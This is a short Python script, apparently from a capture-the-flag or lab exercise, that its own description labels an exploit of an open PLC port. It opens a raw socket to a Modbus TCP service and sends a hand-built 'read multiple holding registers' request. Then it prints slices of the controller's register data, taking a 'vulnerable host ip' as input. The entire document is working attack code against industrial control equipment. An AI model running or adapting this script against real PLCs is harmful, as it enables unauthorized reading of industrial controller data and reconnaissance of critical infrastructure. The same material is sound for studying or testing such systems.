#!/usr/bin/env python3
import argparse, socket

#START ME LIKE ./1.py 127.0.0.1 502

def send_modbus_read_multiple_holding_registers(ip, port, start, quantity):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip, port)
    print('connecting to {} port {}'.format(*server_address))
    sock.connect(server_address)
    message = bytes.fromhex("0001000000060103" + ("%0.4X" % start) + ("%0.4X" % quantity))
    try:
        sock.sendall(message)
        data = sock.recv(259)
        #uint16(position*17+3), 17
        print(data[9+0*17*2+8:9+0*17*2+6+34])
        print(data[9+1*17*2+8:9+1*17*2+6+34])
        print(data[9+2*17*2+8:9+2*17*2+6+34])
        print(data[9+3*17*2+8:9+3*17*2+6+34])
        print(data[9+4*17*2+8:9+4*17*2+6+34])
        print(data[9+5*17*2+8:9+5*17*2+6+34])
        print(data[9+6*17*2+8:9+6*17*2+6+34])
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit the first, most notable vulnerability - open plc port")
    parser.add_argument("ip", help="vulnerable host ip passed here")
    parser.add_argument("port", help="port to plc.. possibly, it's 502")
    args = parser.parse_args()
    send_modbus_read_multiple_holding_registers(args.ip, int(args.port), 0, 125)
